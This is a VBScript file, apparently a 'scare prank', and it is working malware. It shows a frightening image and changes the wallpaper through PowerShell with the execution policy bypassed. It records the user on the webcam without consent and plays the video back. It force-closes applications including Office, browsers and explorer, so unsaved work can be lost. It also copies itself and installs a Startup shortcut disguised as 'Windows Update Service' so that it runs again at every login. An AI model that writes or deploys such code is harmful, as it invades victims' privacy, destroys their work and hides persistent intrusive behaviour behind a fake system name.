On Error Resume Next

Dim oShell, oFSO, scriptPath, scaryImgUrl, scaryImgPath, psPath, bgUrl, bgPath

Set oShell = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")

' ========== 1. SHOW SCARY IMAGE ==========
scaryImgUrl = "https://wallpapers.com/images/hd/scary-face-pictures-wtvdzqnwvit6n0te.jpg"
scaryImgPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\scary-face.jpg"
DownloadToFile scaryImgUrl, scaryImgPath
If oFSO.FileExists(scaryImgPath) Then
    oShell.Run "mspaint.exe """ & scaryImgPath & """", 1, False
    WScript.Sleep 1800
End If

' ========== 2. CREEPY MSGBOX ==========
MsgBox "I'm watching you", 16, "..."

' ========== 3. CHANGING BACKGROUND ==========
bgUrl = "https://wallpaperaccess.com/full/2332759.jpg"
bgPath = oShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\wallpaper.jpg"
psPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\setwp.ps1"
If oFSO.FileExists(bgPath) Then oFSO.DeleteFile bgPath
DownloadToFile bgUrl, bgPath

If oFSO.FileExists(bgPath) Then
    ' PowerShell background script
    Dim oTxt
    Set oTxt = oFSO.CreateTextFile(psPath, True)
    oTxt.WriteLine "$path = '" & bgPath & "'"
    oTxt.WriteLine "Add-Type -TypeDefinition @'"
    oTxt.WriteLine "using System;"
    oTxt.WriteLine "using System.Runtime.InteropServices;"
    oTxt.WriteLine "public class Wallpaper {"
    oTxt.WriteLine "    [DllImport(""user32.dll"")]"
    oTxt.WriteLine "    public static extern int SystemParametersInfo(int a, int b, string c, int d);"
    oTxt.WriteLine "}"
    oTxt.WriteLine "'@"
    oTxt.WriteLine "[Wallpaper]::SystemParametersInfo(20, 0, $path, 3)"
    oTxt.Close

    ' Wait for file
    Dim i
    For i = 1 To 10
        WScript.Sleep 500
        If oFSO.FileExists(bgPath) Then
            If oFSO.GetFile(bgPath).Size > 0 Then Exit For
        End If
    Next
    oShell.Run "powershell -ExecutionPolicy Bypass -File """ & psPath & """", 0, True
End If

WScript.Sleep 1000

' ========== 4. CAMERA: open, record, play result ==========
oShell.Run "explorer.exe microsoft.windows.camera:", 1, False
WScript.Sleep 2500
oShell.AppActivate "Camera"
WScript.Sleep 800
oShell.SendKeys " "
WScript.Sleep 5000
oShell.SendKeys " "
WScript.Sleep 2000

' ========== 5. Find and open newest video ==========
Dim photoPath, folder, file, newestFile, newestDate
photoPath = oShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\Camera Roll"
newestDate = #1/1/1900#
newestFile = ""
If oFSO.FolderExists(photoPath) Then
    Set folder = oFSO.GetFolder(photoPath)
    For Each file In folder.Files
        If LCase(oFSO.GetExtensionName(file.Path)) = "mp4" Then
            If file.DateLastModified > newestDate Then
                newestDate = file.DateLastModified
                newestFile = file.Path
            End If
        End If
    Next
    If newestFile <> "" Then
        oShell.Run """" & newestFile & """"
    End If
End If

WScript.Sleep 5000

' ========== 6. "You look beautiful" ==========
MsgBox "you look. . . beautiful.", 64, "..."

' ========== 7. Minimize and close all user apps, including explorer, camera, video apps ==========
WScript.Sleep 2000
oShell.SendKeys "^{ESC}": WScript.Sleep 200
oShell.SendKeys "^{ESC}": WScript.Sleep 500

' Broader process kill list, including video apps like Movies & TV
Dim appList, appName
appList = Array("notepad.exe", "mspaint.exe", "calc.exe", "Microsoft.Photos.exe", "camera.exe", "SystemSettings.exe", "winword.exe", "excel.exe", "powerpnt.exe", "chrome.exe", "firefox.exe", "msedge.exe", "wmplayer.exe", "explorer.exe", "WindowsCamera.exe", "Video.UI.exe", "VideoPlayer.exe", "MovieMaker.exe", "Groove.exe")
For Each appName In appList
    oShell.Run "powershell -WindowStyle hidden -Command ""Get-Process " & Replace(appName, ".exe", "") & " -ErrorAction SilentlyContinue | Stop-Process -Force""", 0, True
Next

WScript.Sleep 900

' ========== 8. Final scary message ==========
MsgBox "YoU dId ThIs", 16, "The End"

' ========== 9. Self-copy & Startup shortcut ==========
scriptPath = WScript.ScriptFullName
Dim copyTo, shortcutPath, ws, startupFldr
copyTo = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\winupdate.vbs"
oFSO.CopyFile scriptPath, copyTo, True

Set ws = CreateObject("WScript.Shell")
startupFldr = ws.SpecialFolders("Startup")
shortcutPath = startupFldr & "\winupdate.lnk"
If oFSO.FileExists(shortcutPath) Then oFSO.DeleteFile shortcutPath
Dim shortcut
Set shortcut = ws.CreateShortcut(shortcutPath)
shortcut.TargetPath = copyTo
shortcut.WindowStyle = 1
shortcut.Description = "Windows Update Service"
shortcut.Save

' ========== 10. Play LOUD YouTube sound ==========
oShell.Run "https://www.youtube.com/watch?v=7iUiVa2tfFo", 1, False

' ======= DownloadToFile FUNCTION ==========
Sub DownloadToFile(url, path)
    On Error Resume Next
    Dim x, s
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", url, False
    x.setRequestHeader "User-Agent", "Mozilla/5.0"
    x.Send
    If x.Status = 200 Then
        Set s = CreateObject("ADODB.Stream")
        s.Type = 1
        s.Open
        s.Write x.ResponseBody
        s.SaveToFile path, 2
        s.Close
    End If
End Sub
